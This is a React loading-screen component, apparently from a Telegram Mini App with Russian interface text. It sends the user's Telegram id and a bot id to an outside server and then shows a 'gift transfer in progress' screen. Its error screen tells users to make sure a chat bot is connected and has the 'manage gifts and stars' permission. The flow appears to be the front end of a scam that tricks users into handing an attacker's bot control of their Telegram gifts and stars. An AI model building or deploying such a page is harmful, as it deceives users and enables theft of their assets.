import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';

export default function Loading() {
  const navigate = useNavigate();
  const location = useLocation();
  const [error, setError] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);

  useEffect(() => {
    const searchParams = new URLSearchParams(location.search);
    const bot_id = searchParams.get('bot_id');
    const user_id = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;

    const checkConnection = async () => {
      try {
        const wait5sec = new Promise(resolve => setTimeout(resolve, 5000));

        const fetchConnection = fetch('https://tralalelotralala.digital:8001/check_connection', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user_id, bot_id }),
        });

        const [res] = await Promise.all([fetchConnection, wait5sec]);

        if (!res.ok) throw new Error('Network response was not ok');

        const data = await res.json();
        console.log('[✅] API Response:', data);

        if (data?.connection === true) {
          setIsTransferring(true);
        } else {
          setError(true);
          setTimeout(() => {
            navigate('/intro' + location.search);
          }, 5000);
        }

      } catch (err) {
        console.error('[❌] API call failed:', err);
        setError(true);
        setTimeout(() => {
          navigate('/intro' + location.search);
        }, 5000);
      }
    };

    checkConnection();
  }, []);

  if (error) {
    return (
      <div className="h-screen font-sans flex items-center justify-center bg-gray-800 text-red-500 flex-col px-4 text-center">
        <b className="text-2xl mb-6">Не удалось проверить подключение...</b>
      
        <p className="text-base text-gray-300 max-w-md mb-6">
          Такое бывает. Иногда Telegram требуется от 10 секунд до минуты, чтобы применить изменения.
        </p>
      
        <p className="text-base text-gray-300 mb-4">
          Пожалуйста, убедитесь, что:
        </p>
      
        <div className="border border-red-500 rounded-xl p-4 text-left text-sm text-white mb-6 w-full max-w-md">
          <ul className="list-none space-y-2 pl-4 relative">
            <li className="before:content-['•'] before:absolute before:left-0 before:text-white relative pl-4">
              Чат-бот подключен верно
            </li>
            <li className="before:content-['•'] before:absolute before:left-0 before:text-white relative pl-4">
              <span className="block">Стоит галочка «Управлять подарками</span>
              <span className="block pl-[1.65rem]">и звездами»</span>
            </li>
          </ul>
        </div>
      
        <p className="text-sm text-gray-400 italic max-w-md">
          Если всё верно, попробуйте проверить подключение ещё раз.
        </p>
      </div>




    );
  }

  if (isTransferring) {
    return (
      <div className="h-screen font-sans flex items-center justify-center bg-gray-800 text-white flex-col">
        <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-blue-500"></div>
        <b className="mt-10">Выполняется, передача подарка...</b>
        <h3 className="text-gray-400 mt-3">Это может занять от 30 до 60 секунд. Пожалуйста, не закрывайте страницу</h3>
      </div>
    );
  }

  return (
    <div className="h-screen font-sans flex items-center justify-center bg-gray-800 text-white flex-col">
      <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-blue-500"></div>
      <b className="mt-10">Проверяем подключение...</b>
      <h3 className="text-center mt-4 text-gray-400">Это может занять от 30 до 60 секунд. Пожалуйста, не закрвывайте страницу</h3>
    </div>
  );
}

